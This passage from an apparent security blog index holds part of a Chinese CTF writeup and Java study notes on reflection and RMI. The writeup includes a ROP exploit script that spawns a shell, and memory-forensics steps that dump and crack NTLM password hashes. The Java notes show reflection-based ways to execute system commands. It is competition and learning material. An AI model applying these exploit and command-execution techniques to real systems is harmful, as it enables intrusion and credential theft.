<span class="built_in">int</span>(<span class="string">b&#x27;/bin&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">str2 = <span class="built_in">int</span>(<span class="string">b&#x27;/sh\x00&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(str2))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(<span class="number">0x0401D99</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x06030A4</span>) + p64(<span class="number">0</span>) + p64(scanf) + p64(ret_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(n2))</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(<span class="number">0x06030A0</span>) + p64(puts_addr-<span class="number">0x2a300</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/pwn.png" alt="img5"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="颜文字之谜"><a href="#颜文字之谜" class="headerlink" title="颜文字之谜"></a>颜文字之谜</h3><p>通过流量分析可以导出index-demo.html<br>在源码中发现颜文字</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img5.png" alt="img5"></p><p>分析流量包，导出index文件，发现存在多余的长短不一的空格和base64加密过的颜文字，感觉有隐写<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_space.png" alt="img_space"></p><p>用stegsnow看一下</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_stegsnow.png" alt="img_stegsnow"></p><p>那么尝试把文件里面隐藏的base64部分利用起来</p><p>网上找个base64隐写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/kai/Desktop/base.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p>结果是key:”lorrie”</p><p>解码看看<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_lorrie.png" alt="img_lorrie"></p><p>flag头和尾是对的，乱码感觉像是编码问题，我们把它导出为16进制试试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=`stegsnow  -p &quot;lorrie&quot; index-demo.html `</span><br><span class="line">echo $a | perl -ne &#x27;printf&quot;%x&quot;, ord for split //&#x27;</span><br></pre></td></tr></table></figure><p>得到的结果放文件里，再用010导入看看</p><p>默认的ascii编码下依旧是乱码<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_ascii.png" alt="img_ascii"></p><p>我们在 <strong>view -&gt; character setting</strong> 里面把编码换成gbk或者utf试试</p><p>然后发现gbk下的编码能显示正常的字符，我们复制到txt里<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_left.png" alt="img_left"></p><p>发现是 <code>←_←</code> 和 <code>→_→</code> 构成的颜文字</p><p>有可能是二进制，也有可能是摩斯电码<br>经队友提醒，应该是国际电报码</p><p>那我们把 <code>→_→</code> 转成 <code>-</code> ，把 <code>←_←</code> 转成 <code>·</code> ，拿去解码试试</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_elc.png" alt="img_elc"></p><p>成功拿到flag</p><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p>是一道内存取证题，题目要求我们去拿到当前用户的密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump</span><br></pre></td></tr></table></figure><blockquote><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02:::</p></blockquote><p>有个叫做CTF的账号，估计就是当前用户了</p><p>CTF密码ntlm查询出来是qwer1234，然后MD5就是flag</p><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>看上去是明文攻击，但是flag.txt是强加密的，估计明文攻击无效</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_zip.png" alt="img_zip"></p><p>干脆字典爆出压缩包密码<br><code>123%asd!O</code><br>然后栅栏密码解码得到flag</p><h3 id="隐藏的秘密"><a href="#隐藏的秘密" class="headerlink" title="隐藏的秘密"></a>隐藏的秘密</h3><p>查看进程，发现notepad.exe，pid为2440，不过内容是乱码的，估计存在编码问题，那我们干脆把进程导出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 memdump -p 2440 -D ./my_mem/out/hxb</span><br></pre></td></tr></table></figure><p>用diskgenius打开导出的dmp文件可以看到</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/.%5Cimg%5Cimg6.png" alt="img6"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p>于是导出用户名和密码，批量解NTLM，最后尝试密码为<code>NIAIWOMA</code>的账户和密码MD5<br>是flag</p><p>再看一下日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 evtlogs -D ./my_mem/out/hxb</span><br><span class="line"></span><br><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 timeliner &gt; ./my_mem/out/hxb</span><br></pre></td></tr></table></figure><p>发现这个电脑权限都是写在用户组里面的，常规用户应该都是<code>S-1-5-18</code>这个用户组的</p><p>但是看不到具体是哪些用户进行的操作，是我太菜了</p><p>复现的时候发现 <code>SAM\Domains\Account\Users\Names</code> 这个注册表目录下存在所有用户，查看用户的键值，可以发现存在一个注册表最后修改的时间</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_subkeys.png" alt="img_subkeys"></p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_regtime.png" alt="img_regtime"></p><p>查看几个用户，发现他们的修改时间都在 14:02 这个时间<br>而整个表的最后修改时间是在 14:07 之后，所以只需要把 14:07 修改注册表的用户找出来就行了，搓个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">hide_mem = <span class="string">&quot;../my_mem/hide.vmem&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;python ../vol.py -f ../my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names\\&#123;&#125;&quot;&#x27;</span></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="comment"># list = os.system(&quot;ls ../my_mem/&quot;)</span></span><br><span class="line"></span><br><span class="line">user_list = <span class="built_in">open</span>(<span class="string">&quot;./user_list.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split()</span><br><span class="line"><span class="comment"># print(user_list)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test = os.system(payload.format(user_list[0]))</span></span><br><span class="line"><span class="comment"># print(payload.format(user_list[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(&quot;14:02:09&quot;))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> user_list:</span><br><span class="line">    test = os.popen(payload.<span class="built_in">format</span>(i)).readlines()</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(test)</span><br><span class="line">    <span class="comment"># print(output)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;14:02:09&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>文件路径需要根据具体情况进行修改<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_AI.png" alt="img_AI"></p><p>十几分钟大概可以出来</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>简单异或直接脚本跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span></span><br><span class="line">b=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    b+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])^i)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>动态调试，一位一位爆出来</p><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span></span><br><span class="line"> ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">n</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">            n=n*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=n//<span class="number">2</span></span><br><span class="line">        result.append(n)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        result = decode(i)</span><br><span class="line">        string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">            string += <span class="built_in">str</span>(result[x])</span><br><span class="line">            string += <span class="built_in">str</span>(result[(<span class="built_in">len</span>(result) - x - <span class="number">1</span>)])</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update(string.encode())</span><br><span class="line">        md5 = md5.hexdigest()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">            <span class="keyword">if</span> md5 == <span class="built_in">list</span>[line]:</span><br><span class="line">                <span class="built_in">print</span> line,<span class="string">&#x27;-&gt;&#x27;</span>,<span class="built_in">chr</span>(i)</span><br></pre></td></tr></table></figure><p>然后按顺序排序MD5即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（反射）</title>
      <link href="/2021/10/31/java_study/java_day1/"/>
      <url>/2021/10/31/java_study/java_day1/</url>
      
        <content type="html"><![CDATA[<h2 id="day1—java反射"><a href="#day1—java反射" class="headerlink" title="day1—java反射"></a>day1—java反射</h2><h3 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h3><blockquote><p>Class.forName(“className”) 知道类名</p><p>Demo.class 加载类后</p><p>demo_reflect.getClass(); 实例对象获取class</p></blockquote><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><blockquote><p>getMethod 获取类中方法 getMethod(“methodName”,参数类型的类)</p><p>invoke 用于传参 invoke(“实例对象或类”,”参数”)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// get class</span></span><br><span class="line">        Demo_reflect demo_reflect = <span class="keyword">new</span> Demo_reflect();</span><br><span class="line">        System.out.println(demo_reflect.getClass());</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;Main.Demo_reflect&quot;</span>);</span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">        System.out.println(Demo_reflect.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//get method</span></span><br><span class="line">        System.out.println(clazz.getMethod(<span class="string">&quot;getName&quot;</span>).invoke(clazz.newInstance()));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;setName&quot;</span>,String.class).invoke(clazz.newInstance(),<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//result</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span>.<span class="title">Demo_reflect</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Main</span>.<span class="title">Demo_reflect</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Main</span>.<span class="title">Demo_reflect</span></span></span><br><span class="line"><span class="class"><span class="title">demo</span></span></span><br></pre></td></tr></table></figure><h3 id="Runtime-exec"><a href="#Runtime-exec" class="headerlink" title="Runtime.exec"></a>Runtime.exec</h3><p>通过源码我们可以看到，Runtime是一个私有方法，只能通过getRuntime来获取这个私有方法，而getRuntime又是静态的，所以我们只能直接通过类来调用getRuntime，从而获取一个Runtime对象</p><p><img src="/2021/10/31/java_study/java_day1/image-20211011133508396.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class runtimeCls = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method execMethod = runtimeCls.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">Method getRuntimeMethod = runtimeCls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object run = getRuntimeMethod.invoke(runtimeCls);</span><br><span class="line">execMethod.invoke(run,<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">runtimeCls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(runtimeCls.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runtimeCls),<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/java_study/java_day1/image-20211011133420403.png" alt="image-20211011133420403"></p><h3 id="java命令执行方式"><a href="#java命令执行方式" class="headerlink" title="java命令执行方式"></a>java命令执行方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Runtime.getRuntime().exec()</span></span><br><span class="line">InputStream in = Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> readSize = <span class="number">0</span>;</span><br><span class="line">        OutputStream infoStream = <span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((readSize = in.read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            infoStream.write(bytes, <span class="number">0</span>,readSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProcessBuilder().start()</span></span><br><span class="line">InputStream in1 = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;id&quot;</span>).start().getInputStream();</span><br><span class="line">        <span class="keyword">while</span> ((readSize = in1.read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            infoStream.write(bytes, <span class="number">0</span>,readSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProcessImpl</span></span><br><span class="line">String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">        Class piClaszz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method piMethod = piClaszz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>,String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        piMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Process e = (Process) piMethod.invoke(<span class="keyword">null</span>,cmds,<span class="keyword">null</span>,<span class="string">&quot;.&quot;</span>,<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">while</span> ((readSize = e.getInputStream().read(bytes)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            infoStream.write(bytes, <span class="number">0</span>,readSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">System.out.println(infoStream.toString());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（RMI）</title>
      <link href="/2021/10/31/java_study/java_day2/"/>
      <url>/2021/10/31/java_study/java_day2/</url>
      
        <content type="html"><![CDATA[<h2 id="day2—java-RMI"><a href="#day2—java-RMI" class="headerlink" title="day2—java_RMI"></a>day2—java_RMI</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h4><p>一个interface（抽象方法），该interface中没有申明任何方法，但是只有继承该接口才可以被远程调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="RemoteException"><a href="#RemoteException" class="headerlink" title="RemoteException"></a>RemoteException</h4><p>RemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常</p><h4 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h4><p>提供向注册中心保存远程对象引用或者从注册中心获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如:<code>//host:port/name</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/rmi&quot;</span>);</span><br><span class="line">        String hello = rmi.hello();</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h4><p>一个interface, 其功能和<code>Naming</code>类似，每个方法都有一个String类型的name参数，但是这个name不是URL格式，是远程对象的一个命名。Registry的实例可以通过方法<code>LocateRegistry.getRegistry()</code>获得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 